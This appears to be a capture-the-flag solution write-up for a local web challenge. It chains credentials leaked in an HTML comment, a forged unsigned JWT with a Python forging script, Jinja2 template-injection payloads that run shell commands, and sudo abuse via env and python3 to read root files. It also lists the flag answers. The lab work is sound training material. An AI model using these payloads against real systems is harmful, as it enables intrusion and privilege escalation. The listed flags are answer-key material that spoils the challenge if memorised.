## Solution

<details>
<summary>Click to reveal solution</summary>

### Step 1: Find Credentials

Navigate to http://localhost:5002. You see a login form with no obvious credentials.

**View the page source** (Ctrl+U or right-click → View Source). Near the bottom you'll find:

```html
<!-- TODO: Remove before production deployment
     Dev credentials: user / password123
-->
```

Login with `user` / `password123`.

### Step 2: Understand the JWT

After login, the dashboard displays your session token:

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoidXNlciJ9.
```

Decode the parts (base64url):

**Header:**
```json
{"alg": "none", "typ": "JWT"}
```

**Payload:**
```json
{"username": "user", "role": "user"}
```

The `"alg": "none"` means no signature verification.

### Step 3: Modify the JWT

Change `"role": "user"` to `"role": "admin"` and re-encode:

```python
import base64, json

def b64url_encode(data):
    return base64.b64encode(json.dumps(data).encode()).decode().replace('+','-').replace('/','_').replace('=','')

header = {"alg": "none", "typ": "JWT"}
payload = {"username": "user", "role": "admin"}
token = f"{b64url_encode(header)}.{b64url_encode(payload)}."
print(token)
```

Replace the `token` cookie in your browser (DevTools → Application → Cookies) and refresh. The dashboard now shows "Admin Access Granted" — but no flag here.

### Step 4: Find the Admin Panel (FLAG 1)

The dashboard confirms admin access but doesn't give you a flag. You need to discover the admin panel.

Try common admin paths:
- `/admin` — 404
- `/admin/panel` — the admin control panel with **FLAG 1**

**FLAG 1**: `DUNO{DUNO{69a329523ce1ec88bf63061863d9cb14}}`

### Step 5: Server-Side Template Injection (FLAG 2)

The admin panel has a "Template Preview Tool" at `/admin/template`. This tool renders Jinja2 templates.

**Test for SSTI:**
```
{{ 7 * 7 }}
```
If it renders `49`, SSTI is confirmed.

**Escalate to RCE to read the flag file:**
```
{{request.application.__globals__.__builtins__.__import__('os').popen('cat /app/flag2.txt').read()}}
```

**FLAG 2**: `DUNO{DUNO{816b09aa255516ec745de7b215e2e158}}`

### Step 6: Privilege Escalation to Root (FLAG 3)

Use SSTI-based RCE to enumerate the system:

```
{{request.application.__globals__.__builtins__.__import__('os').popen('sudo -l').read()}}
```

Output reveals:
```
User ctfuser may run the following commands:
    (ALL) NOPASSWD: /usr/bin/env, /usr/bin/python3
```

Both `env` and `python3` are GTFOBins. Use them to read the root flag:

**Via env:**
```
{{request.application.__globals__.__builtins__.__import__('os').popen('sudo /usr/bin/env /bin/sh -c "cat /root/flag3.txt"').read()}}
```

**Via python3:**
```
{{request.application.__globals__.__builtins__.__import__('os').popen('sudo python3 -c "print(open(\\\"/root/flag3.txt\\\").read())"').read()}}
```

**FLAG 3**: `DUNO{DUNO{883c631dbcaca4373e1428a73c6cb19d}}`

</details>